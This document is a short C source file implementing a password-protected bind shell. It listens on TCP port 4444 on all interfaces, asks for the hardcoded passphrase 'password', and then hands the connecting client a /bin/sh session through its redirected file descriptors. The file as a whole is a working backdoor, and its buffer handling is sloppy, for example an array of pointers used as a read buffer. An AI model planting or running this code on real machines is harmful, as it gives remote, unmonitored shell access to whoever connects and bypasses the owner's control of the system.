#include <stdio.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <error.h>
#include <strings.h>
#include <unistd.h>
#include <arpa/inet.h>


main(int argc, char **argv)
{
	// Set up socket variables
	// Socket descriptors
	int svr_sock;
	int client_sock;

	// Socket definitions
	struct sockaddr_in server;
	struct sockaddr_in client;
	int sockaddr_len = sizeof(struct sockaddr_in);

	// Some strings
	char *arguments[] = { "/bin/sh", 0 };
	char *in[] = { "xxxxxxxxxx", 0 };
	bzero(&in, 10);

	// Loop flag
	int connected = 0;
	
	// Populate the server port information
	server.sin_family = AF_INET;  // 2
	server.sin_port = htons(4444);
	server.sin_addr.s_addr = INADDR_ANY; // 0
	bzero(&server.sin_zero, 8);

	// Create the server socket
	if((svr_sock = socket(AF_INET, SOCK_STREAM,  0 )) == -1) // SOCK_STREAM = 1
	{
		perror("Server socket: ");
		exit(-1);
	}

	// Bind the port
	if((bind(svr_sock, (struct sockaddr *)&server, sockaddr_len)) == -1)
	{
		perror("Bind: ");
		exit(-1);
	}

	// Start listening for incoming connections
	if((listen(svr_sock, 2)) == -1)
	{
		perror("Listen: ");
		exit(-1);
	}

	// Start of authentication loop
	do
	{
		// Accept a request and spawn a new socket for the connection
		if((client_sock = accept(svr_sock, (struct sockaddr *)&client, &sockaddr_len)) == -1)
		{
			perror("Accept: ");
			exit(-1);	
		}

		// Request a passphrase
		send(client_sock, (char*)"Speak Friend and Enter: ", 24, 0);
		read(client_sock, &in, 10);

		// Validate the passphrase
		if(strcmp(&in, "password\n") != 0)
		{
			// Reject bad passphrase and reset for next connection
			send(client_sock, (char*)"Goodbye\n", 8, 0);
			close(client_sock);
			printf("Auth fail: %s\n", (char*)in);
			bzero(&in, 10);
		}
		else
		{	
			// Break out of the loop when passphrase is good 
			send(client_sock, (char*)"Welcome\n", 8, 0);
			connected = 1;
			printf("Auth Passed!\n");
		}
	}while(connected == 0);

	// Kill the server socket
	close(svr_sock);

	// Redirect file descriptors to new socket
	dup2(client_sock, 0); // STDIN
	dup2(client_sock, 1); // STDOUT
	dup2(client_sock, 2); // STDERR

	// Start a shell
	execve(arguments[0], &arguments[0], NULL);

	// Clean up when done
	close(client_sock);

}
